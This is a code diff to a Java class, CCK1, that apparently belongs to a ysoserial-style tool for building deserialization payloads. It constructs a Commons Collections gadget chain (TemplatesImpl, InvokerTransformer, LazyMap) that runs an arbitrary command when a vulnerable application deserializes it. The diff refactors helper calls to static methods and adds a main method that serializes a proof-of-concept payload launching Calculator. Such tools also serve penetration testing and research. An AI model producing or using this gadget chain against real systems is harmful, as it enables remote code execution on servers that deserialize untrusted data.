@@ -17,8 +17,7 @@ import java.util.Map;
 public class CCK1 implements ObjectPayload{
     @Override
     public Object getObjectPayload(String command) {
-        Util util = new Util();
-        TemplatesImpl templates = util.createTemplates(command);
+        TemplatesImpl templates = Util.createTemplates(command);
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         HashMap<String, String> innerMap = new HashMap<String, String>();
         Map m = LazyMap.decorate(innerMap, transformer);
@@ -28,8 +27,12 @@ public class CCK1 implements ObjectPayload{
         outerMap.put(tied, "t");
         // clear the inner map data, this is important
         innerMap.clear();
-        util.setFieldValue(transformer, "iMethodName", "newTransformer");
+        Util.setFieldValue(transformer, "iMethodName", "newTransformer");
 
         return outerMap;
+    }
+
+    public static void main(String[] args) {
+        Util.serialize(new CCK1().getObjectPayload("open -a Calculator"));
     }
 }
